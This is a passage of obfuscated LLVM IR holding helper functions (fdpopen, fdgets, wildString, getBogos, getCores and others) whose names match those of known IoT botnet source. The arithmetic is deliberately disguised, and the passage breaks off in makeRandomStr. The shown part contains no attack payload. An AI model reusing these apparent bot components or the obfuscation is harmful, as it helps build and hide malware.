; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %123

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #2
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %123

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #2
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %123

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #2
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %123

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %99 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %123

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #2
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #2
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  call void @_exit(i32 127) #12
  unreachable

; <label>:99:                                     ; preds = %54
  %100 = load i8*, i8** %5, align 8
  %101 = load i8, i8* %100, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 114
  br i1 %103, label %104, label %110

; <label>:104:                                    ; preds = %99
  %105 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %106 = load i32, i32* %105, align 4
  store i32 %106, i32* %6, align 4
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %108 = load i32, i32* %107, align 4
  %109 = call i32 @close(i32 %108)
  br label %116

; <label>:110:                                    ; preds = %99
  %111 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %112 = load i32, i32* %111, align 4
  store i32 %112, i32* %6, align 4
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %114 = load i32, i32* %113, align 4
  %115 = call i32 @close(i32 %114)
  br label %116

; <label>:116:                                    ; preds = %110, %104
  %117 = load i32, i32* %9, align 4
  %118 = load i32*, i32** @fdopen_pids, align 8
  %119 = load i32, i32* %6, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i32, i32* %118, i64 %120
  store i32 %117, i32* %121, align 4
  %122 = load i32, i32* %6, align 4
  store i32 %122, i32* %3, align 4
  br label %123

; <label>:123:                                    ; preds = %116, %56, %47, %37, %30, %25
  %124 = load i32, i32* %3, align 4
  ret i32 %124
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %65

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %63

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = xor i32 65280, -1
  %59 = xor i32 %57, %58
  %60 = and i32 %59, %57
  %61 = and i32 %57, 65280
  %62 = ashr i32 %60, 8
  br label %63

; <label>:63:                                     ; preds = %53, %52
  %64 = phi i32 [ -1, %52 ], [ %62, %53 ]
  store i32 %64, i32* %2, align 4
  br label %65

; <label>:65:                                     ; preds = %63, %19
  %66 = load i32, i32* %2, align 4
  ret i32 %66
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %40

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add i32 %35, 1873245788
  %37 = add i32 %36, 1
  %38 = sub i32 %37, 1873245788
  %39 = add nsw i32 %35, 1
  store i32 %38, i32* %8, align 4
  br label %9

; <label>:40:                                     ; preds = %25
  %41 = load i32, i32* %7, align 4
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %40
  br label %46

; <label>:44:                                     ; preds = %40
  %45 = load i8*, i8** %4, align 8
  br label %46

; <label>:46:                                     ; preds = %44, %43
  %47 = phi i8* [ null, %43 ], [ %45, %44 ]
  ret i8* %47
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %39

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = xor i64 %16, -1
  %24 = xor i64 %22, -1
  %25 = xor i64 1791966787841340597, -1
  %26 = and i64 %23, 1791966787841340597
  %27 = and i64 %16, %25
  %28 = and i64 %24, 1791966787841340597
  %29 = and i64 %22, %25
  %30 = or i64 %26, %27
  %31 = or i64 %28, %29
  %32 = xor i64 %30, %31
  %33 = or i64 %23, %24
  %34 = xor i64 %33, -1
  %35 = or i64 1791966787841340597, %25
  %36 = and i64 %34, %35
  %37 = or i64 %32, %36
  %38 = or i64 %16, %22
  store i64 %37, i64* %3, align 8
  br label %4

; <label>:39:                                     ; preds = %12
  %40 = load i64, i64* %3, align 8
  ret i64 %40
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %84 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %47
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %126

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %38

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %36

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  %31 = and i1 true, %30
  %32 = xor i1 true, true
  %33 = and i1 %29, %32
  %34 = or i1 %31, %33
  %35 = xor i1 %29, true
  br label %36

; <label>:36:                                     ; preds = %24, %19
  %37 = phi i1 [ false, %19 ], [ %34, %24 ]
  br label %38

; <label>:38:                                     ; preds = %36, %13
  %39 = phi i1 [ true, %13 ], [ %37, %36 ]
  %40 = xor i1 %39, true
  %41 = and i1 true, %40
  %42 = xor i1 true, true
  %43 = and i1 %39, %42
  %44 = or i1 %41, %43
  %45 = xor i1 %39, true
  %46 = zext i1 %44 to i32
  store i32 %46, i32* %3, align 4
  br label %126

; <label>:47:                                     ; preds = %2
  %48 = load i8*, i8** %5, align 8
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %52, label %70

; <label>:52:                                     ; preds = %47
  %53 = load i8*, i8** %4, align 8
  %54 = getelementptr inbounds i8, i8* %53, i64 1
  %55 = load i8*, i8** %5, align 8
  %56 = getelementptr inbounds i8, i8* %55, i64 1
  %57 = call i32 @wildString(i8* %54, i8* %56)
  %58 = icmp ne i32 %57, 0
  %59 = xor i1 %58, true
  %60 = and i1 false, %59
  %61 = xor i1 false, true
  %62 = and i1 %58, %61
  %63 = xor i1 true, true
  %64 = and i1 %63, false
  %65 = and i1 true, %61
  %66 = or i1 %60, %62
  %67 = or i1 %64, %65
  %68 = xor i1 %66, %67
  %69 = xor i1 %58, true
  br label %70

; <label>:70:                                     ; preds = %52, %47
  %71 = phi i1 [ false, %47 ], [ %68, %52 ]
  %72 = xor i1 %71, true
  %73 = and i1 false, %72
  %74 = xor i1 false, true
  %75 = and i1 %71, %74
  %76 = xor i1 true, true
  %77 = and i1 %76, false
  %78 = and i1 true, %74
  %79 = or i1 %73, %75
  %80 = or i1 %77, %78
  %81 = xor i1 %79, %80
  %82 = xor i1 %71, true
  %83 = zext i1 %81 to i32
  store i32 %83, i32* %3, align 4
  br label %126

; <label>:84:                                     ; preds = %2
  %85 = load i8*, i8** %4, align 8
  %86 = load i8, i8* %85, align 1
  %87 = zext i8 %86 to i32
  %88 = call i32 @toupper(i32 %87) #10
  %89 = load i8*, i8** %5, align 8
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  %92 = call i32 @toupper(i32 %91) #10
  %93 = icmp eq i32 %88, %92
  br i1 %93, label %94, label %112

; <label>:94:                                     ; preds = %84
  %95 = load i8*, i8** %4, align 8
  %96 = getelementptr inbounds i8, i8* %95, i64 1
  %97 = load i8*, i8** %5, align 8
  %98 = getelementptr inbounds i8, i8* %97, i64 1
  %99 = call i32 @wildString(i8* %96, i8* %98)
  %100 = icmp ne i32 %99, 0
  %101 = xor i1 %100, true
  %102 = and i1 true, %101
  %103 = xor i1 true, true
  %104 = and i1 %100, %103
  %105 = xor i1 true, true
  %106 = and i1 %105, true
  %107 = and i1 true, %103
  %108 = or i1 %102, %104
  %109 = or i1 %106, %107
  %110 = xor i1 %108, %109
  %111 = xor i1 %100, true
  br label %112

; <label>:112:                                    ; preds = %94, %84
  %113 = phi i1 [ false, %84 ], [ %110, %94 ]
  %114 = xor i1 %113, true
  %115 = and i1 true, %114
  %116 = xor i1 true, true
  %117 = and i1 %113, %116
  %118 = xor i1 true, true
  %119 = and i1 %118, true
  %120 = and i1 true, %116
  %121 = or i1 %115, %117
  %122 = or i1 %119, %120
  %123 = xor i1 %121, %122
  %124 = xor i1 %113, true
  %125 = zext i1 %123 to i32
  store i32 %125, i32* %3, align 4
  br label %126

; <label>:126:                                    ; preds = %112, %70, %38, %9
  %127 = load i32, i32* %3, align 4
  ret i32 %127
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %90, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %92

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i32 0, i32 0)) #10
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %90

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

; <label>:22:                                     ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

; <label>:27:                                     ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

; <label>:32:                                     ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

; <label>:37:                                     ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22

; <label>:42:                                     ; preds = %37
  br label %43

; <label>:43:                                     ; preds = %69, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* %45) #10
  %47 = add i64 %46, -8951256498252915609
  %48 = sub i64 %47, 1
  %49 = sub i64 %48, -8951256498252915609
  %50 = sub i64 %46, 1
  %51 = getelementptr inbounds i8, i8* %44, i64 %49
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 13
  br i1 %54, label %67, label %55

; <label>:55:                                     ; preds = %43
  %56 = load i8*, i8** %6, align 8
  %57 = load i8*, i8** %6, align 8
  %58 = call i64 @strlen(i8* %57) #10
  %59 = sub i64 %58, 1752761989281143068
  %60 = sub i64 %59, 1
  %61 = add i64 %60, 1752761989281143068
  %62 = sub i64 %58, 1
  %63 = getelementptr inbounds i8, i8* %56, i64 %61
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 10
  br label %67

; <label>:67:                                     ; preds = %55, %43
  %68 = phi i1 [ true, %43 ], [ %66, %55 ]
  br i1 %68, label %69, label %77

; <label>:69:                                     ; preds = %67
  %70 = load i8*, i8** %6, align 8
  %71 = load i8*, i8** %6, align 8
  %72 = call i64 @strlen(i8* %71) #10
  %73 = sub i64 0, 1
  %74 = add i64 %72, %73
  %75 = sub i64 %72, 1
  %76 = getelementptr inbounds i8, i8* %70, i64 %74
  store i8 0, i8* %76, align 1
  br label %43

; <label>:77:                                     ; preds = %67
  %78 = load i8*, i8** %6, align 8
  %79 = call i8* @strchr(i8* %78, i32 46) #10
  %80 = icmp ne i8* %79, null
  br i1 %80, label %81, label %84

; <label>:81:                                     ; preds = %77
  %82 = load i8*, i8** %6, align 8
  %83 = call i8* @strchr(i8* %82, i32 46) #10
  store i8 0, i8* %83, align 1
  br label %84

; <label>:84:                                     ; preds = %81, %77
  %85 = load i8*, i8** %3, align 8
  %86 = load i8*, i8** %6, align 8
  %87 = call i8* @strcpy(i8* %85, i8* %86) #2
  %88 = load i32, i32* %4, align 4
  %89 = call i32 @close(i32 %88)
  store i32 0, i32* %2, align 4
  br label %95

; <label>:90:                                     ; preds = %13
  %91 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %91, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:92:                                     ; preds = %8
  %93 = load i32, i32* %4, align 4
  %94 = call i32 @close(i32 %93)
  store i32 1, i32* %2, align 4
  br label %95

; <label>:95:                                     ; preds = %92, %84
  %96 = load i32, i32* %2, align 4
  ret i32 %96
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %21, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %23

; <label>:10:                                     ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i32 0, i32 0)) #10
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %21

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = sub i32 0, 1
  %19 = sub i32 %17, %18
  %20 = add nsw i32 %17, 1
  store i32 %19, i32* %1, align 4
  br label %21

; <label>:21:                                     ; preds = %16, %10
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:23:                                     ; preds = %5
  %24 = load i32, i32* %2, align 4
  %25 = call i32 @close(i32 %24)
  %26 = load i32, i32* %1, align 4
  ret i32 %26
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
